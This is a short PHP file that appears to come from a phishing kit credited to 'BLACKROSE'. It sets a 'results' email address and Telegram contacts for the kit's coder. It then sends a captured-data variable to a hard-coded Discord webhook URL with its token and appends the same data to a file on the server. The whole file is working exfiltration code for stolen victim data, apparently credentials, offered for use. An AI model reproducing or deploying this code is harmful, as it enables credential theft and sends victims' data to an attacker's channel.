<?php

/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "logs@constructvine.store";
/* --------------------------  */

/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */
$Coders_Telegram = "t.me/BLACKROSE_1337";  // 🖥️ Connect with the Mastermind
$Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad
/* -------------------------------- */

// Discord Webhook URL
$webhook_url = "https://discord.com/api/webhooks/1314060980216397834/6oTvISKAwap2feJ3eGci4kyVimOWZgPLIi5m3e6QtPNVtBhEyUTFZ_iQkJSTg4ANN8tL";

// Send data to Discord Webhook
$data = array("content" => $yagmai);
$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ),
);
$context = stream_context_create($options);
file_get_contents($webhook_url, false, $context);

$f = fopen("../../a.php", "a");
fwrite($f, $yagmai);
?>
